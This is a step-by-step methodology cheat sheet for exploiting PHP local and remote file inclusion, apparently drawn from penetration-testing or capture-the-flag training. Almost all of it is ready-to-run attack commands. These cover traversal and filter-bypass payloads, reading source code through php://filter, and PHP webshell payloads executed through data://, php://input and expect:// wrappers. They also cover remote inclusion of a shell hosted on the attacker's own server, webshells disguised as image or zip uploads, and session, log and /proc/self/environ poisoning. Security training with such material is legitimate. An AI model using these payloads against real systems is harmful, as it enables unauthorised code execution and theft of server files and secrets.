# File Inclusion Methodology

**Core concept:** User-controlled input passed to a file-loading function without sanitization. Leads to arbitrary file read, source code disclosure, and RCE (if execute-capable function is used).

**Read vs Execute vs Remote URL — matters for attack path:**

| Function | Read | Execute | Remote URL |
|----------|------|---------|------------|
| PHP `include()/include_once()` | ✅ | ✅ | ✅ |
| PHP `require()/require_once()` | ✅ | ✅ | ❌ |
| PHP `file_get_contents()` | ✅ | ❌ | ✅ |
| PHP `fopen()/file()` | ✅ | ❌ | ❌ |
| NodeJS `res.render()` | ✅ | ✅ | ❌ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

---

## Phase 1 — Identify the Vulnerability

```bash
# Check page source for LFI pattern (language/page/view param)
curl -s http://<TARGET>/ | grep -i "language\|page\|view\|file\|path"

# Try direct inclusion
curl -s "http://<TARGET>/index.php?language=/etc/passwd" | grep root

# Try path traversal (4 levels covers most webroot depths)
curl -s "http://<TARGET>/index.php?language=../../../../etc/passwd" | grep root

# Fuzz for hidden parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://<TARGET>/index.php?FUZZ=value" -fs <BASELINE_SIZE> -t 100 -s
```

**Get two sizes:** baseline (default content) AND failed-include (nonexistent file). Filter both when fuzzing.

---

## Phase 2 — Basic LFI

### Absolute Path (no prefix)
```bash
?language=/etc/passwd
?language=/var/www/html/index.php
```

### Path Traversal (prefix appended)
```bash
?language=../../../../etc/passwd
# Add more ../ until it works — extra ones are harmless (/ stays at /)
```

### Approved Path + Traversal (regex filter)
```bash
# Check nav links for exact approved prefix: e.g. "languages/en.php"
?language=languages/../../../../etc/passwd
```

---

## Phase 3 — Bypass Filters

### Non-Recursive `../` Removal
```bash
# str_replace('../', '', $input) runs once — not recursive
?language=....//....//....//....//etc/passwd
# ....// → after removing ../ → ../  ✓
```

### URL Encoding
```bash
# Encode all chars including dots
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encode (bypasses filters that decode once before checking)
?language=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%2fpasswd
```

### Approved Path + Non-Recursive Filter (combined)
```bash
?language=languages/....//....//....//....//etc/passwd
```

---

## Phase 4 — PHP Filters (Source Code Disclosure)

```bash
# Fuzz for PHP files first
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u "http://<TARGET>/FUZZ.php" -mc 200,301,302,403 -t 100 -s

# Read source without executing (omit .php — it gets appended automatically)
curl -s "http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=config" \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | base64 -d

# Read file at absolute path (with extension in resource)
curl -s "http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" \
  | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d | grep allow_url_include
```

**Why base64:** PHP source contains `<?php` which would execute instead of display. Base64 filter returns encoded string instead.

---

## Phase 5 — PHP Wrappers (RCE)

### Check Prerequisites
```bash
# Check allow_url_include (needed for data:// and php://input)
curl -s "http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" \
  | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d 2>/dev/null | grep allow_url_include
```

### data:// Wrapper
```bash
# Base64-encode the webshell first
echo '<?php system($_GET["cmd"]); ?>' | base64
# → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

curl -s "http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"
```

### php://input Wrapper
```bash
# POST the webshell as request body, pass cmd as GET param
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://<TARGET>/index.php?language=php://input&cmd=id" | grep uid
```

### expect:// Wrapper (if enabled)
```bash
curl -s "http://<TARGET>/index.php?language=expect://id" | grep uid
```

**Fallback order:** `php://input` → `data://` → `expect://`

---

## Phase 6 — Remote File Inclusion (RFI)

### Verify RFI Works
```bash
# Include local URL first (avoids firewall blocks during test)
curl -s "http://<TARGET>/index.php?language=http://127.0.0.1:80/index.php"
# If page content appears in LFI area → RFI confirmed
```

### RFI via HTTP
```bash
# Setup
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server <PORT> &

# Execute
curl -s "http://<TARGET>/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=id" | grep uid
```

### RFI via FTP
```bash
sudo python -m pyftpdlib -p 21
curl -s "http://<TARGET>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id"
```

### Find the flag
```bash
# Find flag files
curl -s "http://<TARGET>/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=find+/+-maxdepth+2+-name+'*.txt'+2>/dev/null" \
  | python3 -c "import sys,re; print(re.findall(r'Containers</h2>(.*?)<p', sys.stdin.read(), re.S))"

# Read flag
curl -s "http://<TARGET>/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=cat+/FLAG_FILE"
```

---

## Phase 7 — LFI + File Upload (RCE)

### Malicious Image Upload
```bash
# Create image with embedded webshell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif

# Find upload form fields
curl -s "http://<TARGET>/settings.php" | grep -i "input\|form\|name="

# Upload (use correct field name from form)
curl -s -F "uploadFile=@/tmp/shell.gif" "http://<TARGET>/upload.php"

# LFI include the uploaded file
curl -s "http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=id" | grep uid
```

### Zip Upload
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# Upload shell.jpg, then:
curl -s "http://<TARGET>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
```

---

## Phase 8 — Log Poisoning (RCE)

### PHP Session Poisoning
```bash
# Get session cookie
curl -s -c /tmp/cookies.txt "http://<TARGET>/index.php" > /dev/null
SESSID=$(grep PHPSESSID /tmp/cookies.txt | awk '{print $NF}')

# Poison session (single quotes prevent bash variable expansion of $_GET)
curl -s -b /tmp/cookies.txt -G --data-urlencode 'language=<?php system($_GET["cmd"]); ?>' \
  "http://<TARGET>/index.php" > /dev/null

# Include poisoned session and execute (do immediately after poison)
curl -s -b /tmp/cookies.txt \
  "http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_$SESSID&cmd=id" \
  | python3 -c "import sys,re; print(re.findall(r'Containers</h2>(.*?)<p', sys.stdin.read(), re.S))"
```

**Key:** Session is written to disk at END of request. On the include request, the session file still has PHP code from the previous request when include() reads it from disk. Re-poison before EVERY command (include request overwrites the session).

### Apache/Nginx Log Poisoning
```bash
# Verify log is readable
curl -s "http://<TARGET>/index.php?language=/var/log/apache2/access.log" | grep -A3 "Containers</h2>"

# Poison User-Agent (Apache: high priv needed; Nginx: readable by www-data)
curl -s "http://<TARGET>/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Include poisoned log
curl -s "http://<TARGET>/index.php?language=/var/log/apache2/access.log&cmd=id" | grep uid
curl -s "http://<TARGET>/index.php?language=/var/log/nginx/access.log&cmd=id" | grep uid
```

### /proc/self/environ (single-request attack)
```bash
# Poison + include in ONE request — User-Agent is in current process environment
curl -s "http://<TARGET>/index.php?language=/proc/self/environ&cmd=id" \
  -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
```

---

## Phase 9 — Automated Scanning

```bash
# 1. Get baseline size (default content)
curl -s "http://<TARGET>/index.php" | wc -c

# 2. Get failed-include size (nonexistent file)
curl -s "http://<TARGET>/index.php?<PARAM>=nonexistent" | wc -c

# 3. Fuzz hidden parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://<TARGET>/index.php?FUZZ=value" -fs <BASELINE> -t 100 -s

# 4. Fuzz LFI payloads (filter BOTH sizes)
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u "http://<TARGET>/index.php?<PARAM>=FUZZ" -fs <BASELINE>,<FAILED_INCLUDE> -t 100 -s

# 5. Fuzz log/config file paths
ffuf -w ./LFI-WordList-Linux:FUZZ \
  -u "http://<TARGET>/index.php?<PARAM>=../../../../FUZZ" -fs <BASELINE>,<FAILED_INCLUDE> -t 100 -s
```

---

## Decision Flow

```
Found LFI parameter?
  └─ Can read /etc/passwd? → YES: basic LFI works
  └─ Cannot? → Filter in place:
       └─ "Illegal path" error? → approved path filter
            └─ Prefix with approved path (check nav links!)
       └─ Empty response? → str_replace('../') filter
            └─ Use ....// instead of ../
       └─ Still blocked? → URL encode the traversal

Goal is RCE?
  └─ Check allow_url_include via php://filter on php.ini
       └─ ON → try data://, then php://input, then expect://
  └─ Can upload files?
       └─ YES → GIF8 magic bytes + PHP shell → LFI include
  └─ Can poison a log?
       └─ Try session file (most reliable)
       └─ Try Nginx access.log (readable by www-data)
       └─ Try Apache access.log (may need high priv)
       └─ Try /proc/self/environ (single-request, no prior poison needed)
  └─ RFI available?
       └─ Try HTTP → FTP → SMB (Windows)
```
